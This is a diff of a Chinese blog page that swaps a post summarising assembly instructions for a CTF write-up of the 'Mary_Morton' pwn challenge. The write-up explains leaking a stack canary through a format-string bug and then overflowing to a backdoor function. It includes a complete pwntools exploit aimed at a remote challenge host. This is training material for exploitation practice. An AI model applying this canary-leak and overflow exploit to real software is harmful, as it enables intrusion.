@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="汇编指令小结, 矢坕个人博客">
+    <meta name="keywords" content="Mary_Morton, 矢坕个人博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>汇编指令小结 | 矢坕个人博客</title>
+    <title>Mary_Morton | 矢坕个人博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">汇编指令小结</h1>
+                    <h1 class="description center-align post-title">Mary_Morton</h1>
                 </div>
             </div>
         </div>
@@ -443,28 +443,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-11-01
+                    2023-01-04
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-11-02
+                    2023-01-04
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    576
+                    240
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    1 分
                 </div>
                 
 
@@ -482,224 +482,21 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="一-算术运算指令"><a href="#一-算术运算指令" class="headerlink" title="一.算术运算指令"></a>一.算术运算指令</h2><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>模板</th>
-<th>具体作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>add</td>
-<td>add ax,bx</td>
-<td>将bx+ax的值储存在ax中</td>
-</tr>
-<tr>
-<td>sub</td>
-<td>sub ax,bx</td>
-<td>将ax-bx的值存在ax中</td>
-</tr>
-<tr>
-<td>inc</td>
-<td>inc bx</td>
-<td>将bx的值加1,不影响flag寄存器相关位置</td>
-</tr>
-<tr>
-<td>dec</td>
-<td>dec bx</td>
-<td>将bx的值减1，……</td>
-</tr>
-<tr>
-<td>mul</td>
-<td>mul ax,bx</td>
-<td>将ax*bx的值存在ax中，如果是32位乘法则要将高位字节储存与dx中，低位储存于ax中,16位大差不差</td>
-</tr>
-<tr>
-<td>div</td>
-<td>div ax,bx</td>
-<td>ax&#x2F;bx的值储存于ax……</td>
-</tr>
-<tr>
-<td>adc</td>
-<td>adc ah,bh</td>
-<td>(ah）&#x3D;（bh）+（ah）+ CF</td>
-</tr>
-<tr>
-<td>sbb</td>
-<td>sbb ax,bx</td>
-<td>（ax）&#x3D;（ax）-（bx）- CF</td>
-</tr>
-<tr>
-<td>cmp</td>
-<td>cmp ax,bx</td>
-<td>将ax-bx但不储存在任何地方只影响flag寄存器的相关位置，用于判断两数大小</td>
-</tr>
-</tbody></table>
-<h2 id="二-逻辑运算指令"><a href="#二-逻辑运算指令" class="headerlink" title="二.逻辑运算指令"></a>二.逻辑运算指令</h2><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>模板</th>
-<th>具体作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>and</td>
-<td>and ax,bx</td>
-<td>用于定向更改二进制数的某位，如字母的大小写变换，只有两边同为1时结果为1</td>
-</tr>
-<tr>
-<td>or</td>
-<td>or ax,bx</td>
-<td>只有两边都为0时结果为0，其它为1</td>
-</tr>
-<tr>
-<td>xor</td>
-<td>xor ax,bx</td>
-<td>同为1或0结果为0或者为1</td>
-</tr>
-<tr>
-<td>not</td>
-<td>not al</td>
-<td>取al值的反码</td>
-</tr>
-</tbody></table>
-<h2 id="三-目的地址传送指令"><a href="#三-目的地址传送指令" class="headerlink" title="三.目的地址传送指令"></a>三.目的地址传送指令</h2><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>模板</th>
-<th>具体作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>lea</td>
-<td>lea bx,dx:[98H]</td>
-<td>把偏移地址存到dx，相当于C语言中的&amp;符号</td>
-</tr>
-<tr>
-<td>lds</td>
-<td>lds si,string</td>
-<td>把段地址：偏移地址存到ds:si中</td>
-</tr>
-<tr>
-<td>les，lfs，lgs，lss</td>
-<td>……</td>
-<td>……</td>
-</tr>
-</tbody></table>
-<h2 id="四-通用数据传送指令"><a href="#四-通用数据传送指令" class="headerlink" title="四.通用数据传送指令"></a>四.通用数据传送指令</h2><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>模板</th>
-<th>具体作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>mov</td>
-<td>mov ax,bx</td>
-<td>将bx中的数据覆盖到ax中</td>
-</tr>
-<tr>
-<td>push</td>
-<td>push ax</td>
-<td>将ax中的值压入栈中</td>
-</tr>
-<tr>
-<td>pop</td>
-<td>pop ax</td>
-<td>将栈中的值取出进ax中</td>
-</tr>
-</tbody></table>
-<h2 id="五-程序转移指令（长转移）"><a href="#五-程序转移指令（长转移）" class="headerlink" title="五.程序转移指令（长转移）"></a>五.程序转移指令（长转移）</h2><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>模板</th>
-<th>具体作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>jmp</td>
-<td>jmp ax,bx</td>
-<td>无条件跳转指令，根据偏移量进行跳转</td>
-</tr>
-<tr>
-<td>call</td>
-<td>call s</td>
-<td>将当前地址推入栈中，并跳转到s处</td>
-</tr>
-<tr>
-<td>ret</td>
-<td>ret</td>
-<td>将栈中地址弹出至ds：ip并跳转</td>
-</tr>
-</tbody></table>
-<h4 id="条件转移指令（短转移）"><a href="#条件转移指令（短转移）" class="headerlink" title="条件转移指令（短转移）"></a>条件转移指令（短转移）</h4><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>模板</th>
-<th>具体作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>je&#x2F;jz</td>
-<td>je&#x2F;jz s</td>
-<td>若相等则跳转</td>
-</tr>
-<tr>
-<td>jne&#x2F;jnz</td>
-<td>……</td>
-<td>若不相等则跳转</td>
-</tr>
-<tr>
-<td>jb&#x2F;jl</td>
-<td>……</td>
-<td>若小于则跳转</td>
-</tr>
-<tr>
-<td>ja&#x2F;jg</td>
-<td>……</td>
-<td>若大于则跳转</td>
-</tr>
-<tr>
-<td>jge</td>
-<td>……</td>
-<td>若大于等于则跳转</td>
-</tr>
-<tr>
-<td>jle</td>
-<td>……</td>
-<td>若小于等于则跳转</td>
-</tr>
-</tbody></table>
-<h4 id="循环控制指令"><a href="#循环控制指令" class="headerlink" title="循环控制指令"></a>循环控制指令</h4><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>模板</th>
-<th>具体作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>loop</td>
-<td>loop s</td>
-<td>消耗cx中的值，并跳转至s处</td>
-</tr>
-<tr>
-<td>jcxz</td>
-<td>jcxz s</td>
-<td>当cx中值为0时跳转至s</td>
-</tr>
-<tr>
-<td>jecxz</td>
-<td>……</td>
-<td>……</td>
-</tr>
-</tbody></table>
+                <h2 id="Mary-Morton-wp"><a href="#Mary-Morton-wp" class="headerlink" title="Mary_Morton wp"></a>Mary_Morton wp</h2><p>这篇博客主要讲一个方法：利用格式化字符串漏洞泄露canary内容</p>
+<h3 id="格式化字符串漏洞泄露canary"><a href="#格式化字符串漏洞泄露canary" class="headerlink" title="格式化字符串漏洞泄露canary"></a>格式化字符串漏洞泄露canary</h3><p>先checksec一下：<br><img src="/images/Mary-Morton/1.png"><br>开了NX保护和Canary保护，本来一般开了Canary应该不是栈溢出的问题，但这题比较特殊有利用方法。<br>拖进IDA查看：<br><img src="/images/Mary-Morton/2.png"><br>有些名字我改过了<br>这里有两个漏洞可利用：一个是格式化字符串漏洞（format_string_bug），另一个是栈溢出（overflow_string_bug）<br>点进format_string_bug：<br><img src="/images/Mary-Morton/3.png"><br>在虚拟机中运行发现偏移量为6<br><img src="/images/Mary-Morton/4.png"><br>0x90-0x8&#x3D;0x88，0x88&#x2F;8&#x3D;17，17+6&#x3D;23<br>得Canary为printf的第23个参数，而后在溢出的必要位置加入Canary就行<br>overflow_string_bug：<br><img src="/images/Mary-Morton/5.png"><br>后门函数：<br><img src="/images/Mary-Morton/6.png"><br>上exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">54809</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"3. Exit the battle \n"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'%23$p'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
+c_addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"3. Exit the battle \n"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x04008DA</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>获得flag：<br><img src="/images/Mary-Morton/7.png"></p>
 
                 
             </div>
@@ -726,7 +523,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://airunfive.github.io/2022/11/01/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%B0%8F%E7%BB%93/">http://airunfive.github.io/2022/11/01/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%B0%8F%E7%BB%93/</a>
+                    <a href="http://airunfive.github.io/2023/01/04/Mary-Morton/">http://airunfive.github.io/2023/01/04/Mary-Morton/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -931,54 +728,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/11/05/%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E5%92%8C%E7%BA%A6%E5%AE%9A/">
+                <a href="/2023/01/04/Mary-Morton/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="函数的调用和约定">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Mary_Morton">
                         
-                        <span class="card-title">函数的调用和约定</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-11-05
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            矢坕
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/10/27/%E6%B5%85%E6%9E%90jmp%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="浅析jmp指令的原理">
-                        
-                        <span class="card-title">浅析jmp指令的原理</span>
+                        <span class="card-title">Mary_Morton</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -989,7 +750,45 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-04
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            矢坕
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/12/31/int-overflow/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="int_overflow">
+                        
+                        <span class="card-title">int_overflow</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-31
                             </span>
                         <span class="publish-author">
                             
